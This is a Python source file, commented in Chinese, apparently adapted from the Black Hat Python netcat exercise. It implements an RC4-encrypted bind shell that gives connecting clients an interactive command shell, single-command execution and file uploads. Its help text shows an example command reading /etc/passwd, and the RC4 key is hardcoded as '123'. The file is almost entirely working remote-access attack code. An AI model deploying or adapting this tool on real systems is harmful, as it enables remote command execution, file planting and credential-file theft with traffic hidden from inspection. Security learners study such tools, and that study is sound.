import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
from Crypto.Cipher import ARC4


"""
rc4,正向shell
"""

class PyNC:
    """
    定义类型，如果是接收方，执行listen方法，如果是发送发，执行send方法
    """
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.key = '123'

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f'Listening on:{self.args.target}:{self.args.port}')
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(rc4(output.encode(), self.key))
            #client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Save file {self.args.upload}'
            # client_socket.send(message.encode())
            client_socket.send(rc4(message.encode(), self.key))
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(rc4(b'BHP: #>', self.key))
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += rc4_dec(client_socket.recv(1024), self.key)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(rc4(response.encode(), self.key))
                    cmd_buffer = b''

                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        print(f'Connecting:{self.args.target}:{self.args.port}')
        if self.buffer:
            self.socket.send(rc4(self.buffer, self.key))
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = rc4_dec(self.socket.recv(4096), self.key)
                    recv_len = len(data)
                    response = response + data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('>')
                    buffer += '\n'
                    self.socket.send(rc4(buffer.encode(), self.key))
        except KeyboardInterrupt:
            print("User terminated.")
            self.socket.close()
            sys.exit()


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    # subprocess 模块允许你生成新的进程，连接它们的输入、输出、错误管道，并且获取它们的返回码
    # subprocess.checkout:附带参数运行命令并返回其输出
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

def rc4(byttes, key):
    key = bytes(key, encoding='utf-8')

    enc = ARC4.new(key)
    res = enc.encrypt(byttes)

    return res

def rc4_dec(byttes, key):
    key = bytes(key, encoding='utf-8')

    dec = ARC4.new(key)
    res = dec.decrypt(byttes)

    return res


if __name__ == '__main__':
    # description:在参数帮助文档之前显示的文本（默认值：无）
    # epilog:在参数帮助文档之后显示的文本（默认值：无）
    # 传进来的参数直接决定程序是要发送数据还是进行监听
    # 发送方只需要向接收方发起连接，所以只需-t和-p两个参数即可
    paser = argparse.ArgumentParser(description='BHP Net Tool',
                                    epilog=textwrap.dedent('''Example:
                                    pync.py -t 192.168.1.1 -p 5555 -l -c # command shell
                                    pync.py -t 192.168.1.1 -p 5555 -l -u=test.txt # upload to file
                                    pync.py -t 192.168.1.1 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
                                    echo 'ABC' | ./pync.py -t 192.168.1.1 -p 5555 # echo text to server port 5555
                                    pync.py -t 192.168.1.1 -p 5555 # connect to server
                                    '''))
    paser.add_argument('-c', '--command', action='store_true', help='command shell')
    paser.add_argument('-e', '--execute', help='execute specified command')
    paser.add_argument('-l', '--listen', action='store_true', help='listen')
    paser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    paser.add_argument('-t', '--target', help='specificed IP')
    paser.add_argument('-u', '--upload', help='upload file')
    args = paser.parse_args()
    print("*"*20)
    print(args)
    if args.listen:
        buffer = ''
    else:
        # buffer = sys.stdin.read()
        buffer = ""
    print("buffer:", buffer)
    pync = PyNC(args, buffer.encode())
    pync.run()

